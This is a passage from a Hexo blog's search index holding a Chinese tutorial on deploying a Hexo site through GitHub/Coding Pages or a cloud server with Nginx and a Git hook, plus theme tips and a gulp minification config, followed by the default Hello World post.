git即成功推送： 12$ hexo g$ hexo d 域名解析 添加 CNAME 记录指向 &lt;Coding账号名称&gt;.coding.me 类型选择为 CNAME； 主机记录即域名前缀，填写为www； 记录值填写为自定义域名； 解析线路，TTL 默认即可。 添加 两条A 记录指向 192.30.252.153和192.30.252.154 类型选择为 A； 主机记录即域名前缀，填写为@； 记录值填写为192.30.252.153和192.30.252.154； 解析线路，境外或谷歌。 在『Pages 服务』设置页（https://dev.tencent.com/u/&lt;Coding账号名称&gt;/p/&lt;Coding账号名称&gt;/git/pages/settings）中绑定自定义域名。 至此，您的Hexo博客已经解析到自定义域名，https://&lt;Github账号名称&gt;.github.io和https://&lt;Coding账号名称&gt;.coding.me依然可用。 方案四：云服务器 + 域名该方案需要先购买云服务器和域名。 在云服务器安装Git 和 Nginx。(Git 用于版本管理和部署，Nginx 用于静态博客托管。) 登陆root用户，运行： 12$ yum -y update$ yum install -y git nginx Nginx配置 2.1. 创建文件目录(用于博客站点文件存放) 123cd /usr/local/mkdir hexochmod 775 -R /usr/local/hexo/ 2.2. 添加 index.html(用于检测配置 Nginx 是否成功) 1vim /usr/local/hexo/index.html 添加以下代码，并保存。 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset="UTF-8"&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Nginx running&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 2.3. 配置 Nginx 服务器 1vim /etc/nginx/nginx.conf 修改server_name和root： 123456server &#123; listen 80 default_server; listen [::]:80 default_server; server_name www.baidu.com; # 填个人域名 root /usr/local/hexo/; &#125; 2.4. 启动nginx服务； 1service nginx start 2.5. 云服务器浏览器访问个人域名或IP，若跳转index.html，则配置完成，否则检查以上配置。 git配置 3.1. 创建文件目录, 用于私人 Git 仓库搭建, 并更改目录读写权限。 123cd /usr/local/mkdir hexoRepochmod 775 -R /usr/local/hexoRepo/ 3.2. Git 初始化裸库。 12cd hexoRepo/git init --bare hexo.git 3.3. 创建 Git 钩子(hook)。 1vim /usr/local/hexoRepo/hexo.git/hooks/post-receive 3.4. 输入以下信息，用于指定 Git 的源代码 和 Git 配置文件。 123#!/bin/bashgit --work-tree=/usr/local/hexo --git-dir=/usr/local/hexoRepo/hexo.git checkout -f 3.5. 保存并退出后, 给该文件添加可执行权限。 1chmod +x /usr/local/hexoRepo/hexo.git/hooks/post-receive 本地博客推送到云服务器 4.1. 安装hexo-deployer-git插件。在命令行（即Git Bash）运行以下命令即可： 1$ npm install hexo-deployer-git --save 4.2. 添加SSH key。 创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可： 1$ ssh-keygen -t rsa -C "邮箱地址" 添加到 github。 复制密钥文件内容（路径形如C:\Users\Administrator\.ssh\id_rsa.pub），粘贴到New SSH Key即可。 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功： 12$ ssh -T git@github.com$ yes 4.3. 修改_config.yml（在站点目录下）。文件末尾修改为： 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: root@xxx.xxx.xxx.xxx:/usr/local/hexoRepo/hexo //用户名@域名或 IP 地址:/usr/local/hexoRepo/hexo branch: master 注意：上面仓库地址写ssh地址，不写http地址。 4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送： 12$ hexo g$ hexo d 等待1分钟左右，浏览器访问个人域名。 至此，您的Hexo博客已经搭建在云服务器, 域名为个人域名。 Hexo常用命令123456789hexo new "postName" #新建文章hexo new page "pageName" #新建页面hexo clean #清除部署緩存hexo n == hexo new #新建文章hexo g == hexo generate #生成静态页面至public目录hexo s == hexo server #开启预览访问端口（默认端口4000，可在浏览器输入localhost:4000预览）hexo d == hexo deploy #将.deploy目录部署到GitHubhexo g -d #生成加部署hexo g -s #生成加预览 注：当本地预览和远程部署的浏览结果不同的时候，不妨使用hexo clean &amp;&amp; hexo g -d试试。 创建文章命令： 123$ hexo new [layout] &lt;title&gt;复制代码 参数说明： [layout]可以为以下三种： 参数名 功能 文章路径 post 新建博文 source/_posts page 新建页面（如404，分类） source draft 草稿 source/_drafts 草稿可通过一下命令发布： 123$ hexo publish [layout] &lt;title&gt;复制代码 title注意： 不是博文标题， 是博文markdown文件的名字， 也是博文链接的后缀（如https://www.simon96.online/2018/10/12/hexo-tutorial/中的hexo-tutorial） 文章模版 创建模版 在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，例如： $ hexo new blog “simon” ​ 在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 blog.md，并根据其内容建立文章。 修改参数 以下是您可以在模版中使用的变量： 变量 描述 layout 布局 title 标题 date 文件建立日期 Front-matter就是博文最上方以 --- 分隔的那部分。 默认可以使用的Front-matter： 参数 描述 默认值 layout 布局 title 标题 date 建立日期 文件建立日期 updated 更新日期 文件更新日期 comments 开启文章的评论功能 true tags 标签（不适用于分页） categories 分类（不适用于分页） permalink 覆盖文章网址 主题配置hexo主题wiki 可以在此处寻找自己喜欢的主题下载所有的主题文件，保存到Hexo目录下的themes文件夹下。然后在_config.yml文件中修改： 1234# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/theme: landscape //themes文件夹中对应文件夹的名称 然后先执行hexo clean，然后重新hexo g，并且hexo d，很快就能看到新主题的效果了~ 主题优化 设置「RSS」 添加「标签」页面 添加「分类」页面 设置「字体」 设置「代码高亮主题」 侧边栏社交链接 问题：图标哪里找？ 解决：Font Awesome 开启打赏功能 问题：微信支付宝二维码不美观，规格不一。 解决：在线生成二维码 设置友情链接 添加个人联系方式 腾讯公益404页面 站点建立时间 订阅微信公众号 设置「动画效果」 问题：慢，需要等待 JavaScript 脚本完全加载完毕后才会显示内容。 解决：将主题配置文件_config.yml中，use_motion字段的值设为 false 来关闭动画。 设置「背景动画」 添加背景图 修改Logo字体 修改内容区域的宽度 网站标题栏背景颜色 自定义鼠标样式 文章加密访问 实现点击出现桃心效果 静态资源压缩（博文压缩） 修改访问url路径 博文置顶 在右上角或左上角实现fork me on github 主页文章添加边框阴影效果 显示当前浏览记录 常见分类页 加入广告 添加萌萌哒 搜索功能 网易云外链播放器 花里胡哨的玩意儿 修改作者头像并旋转 修改代码块自定义样式 点击爆炸效果 添加萌妹子动图 侧栏设置 透明背景设置 添加阅读全文 设置网站缩略图标 添加站点访问计数 前几个可参考next官方文档配置 （以下用到外部工具） 评论系统 数据统计与分析 内容分享服务 文章加密访问 hexo-blog-encrypt SEOHexo NexT 主题SEO优化指南 seo这东西是使自己的文章能被百度、谷歌搜录，能被搜索到。 因为暂时不想被搜到/doge，所有暂不配置 GitPage 国内优化参考大佬的博客：https://blog.lgf.im/2020/03/speedup-github-page/# 对于html/js/css的压缩：gulp 1234567891011$ # 本机安装$ npm install gulp -g$ #为了github Action 和其他CI\CD平台也能进行安装，推荐$ npm install gulp --save-dev$ # 安装依赖$ npm install gulp-minify-css \ gulp-babel \ gulp-uglify \ gulp-htmlmin \ gulp-htmlclean \ --save-dev 创建配置文件：在博客hexo的根目录下，新建 gulpfile.js 配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354var gulp = require('gulp');var minifycss = require('gulp-minify-css');var uglify = require('gulp-uglify');var htmlmin = require('gulp-htmlmin');var htmlclean = require('gulp-htmlclean');var imagemin = require('gulp-imagemin');// 压缩css文件gulp.task('minify-css', function() &#123; return gulp.src('./public/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public'));&#125;);// 压缩htmlgulp.task('minify-html', function() &#123; return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin(&#123; collapseWhitespace: true, collapseBooleanAttributes: true, removeComments: true, removeEmptyAttributes: true, removeScriptTypeAttributes: true, removeStyleLinkTypeAttributes: true, minifyJS: true, minifyCSS: true, minifyURLs: true, ignoreCustomFragments: [ /\&#123;\&#123;[\s\S]*?\&#125;\&#125;/ ], &#125;)) .pipe(gulp.dest('./public'));&#125;);// 压缩js文件gulp.task('minify-js', function() &#123; return gulp.src(['./public/**/*.js','!./public/js/**/*min.js']) .pipe(uglify()) .pipe(gulp.dest('./public'));&#125;);// 压缩图片gulp.task('minify-images', function() &#123; return gulp.src(['./public/**/*.png', './public/**/*.jpg', './public/**/*.gif', './public/**/*.svg']) .pipe(imagemin(&#123; optimizationLevel: 5, //类型：Number 默认：3 取值范围：0-7（优化等级） progressive: true, //类型：Boolean 默认：false 无损压缩jpg图片 interlaced: false, //类型：Boolean 默认：false 隔行扫描gif进行渲染 multipass: false, //类型：Boolean 默认：false 多次优化svg直到完全优化 &#125;)) .pipe(gulp.dest('./public'));&#125;);gulp.task('default', gulp.series(gulp.parallel('minify-html', 'minify-css', 'minify-js', 'minify-images'))); gulp 压缩完之后快了50% cdn加速我的博客还没应用，先mark一下，可以用jsDelivr进行CDN分发jsDelivr 是一家开源免费CDN，主要是对npm包进行CDN分发绝妙的是它还能对Github和Wordpress进行CDN分发我们可以借助 jsDelivr 的 Github资源分发 服务来对我们博客中的css\js\小图片进行加速 加载时文字可见 使用懒加载]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F05%2F13%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
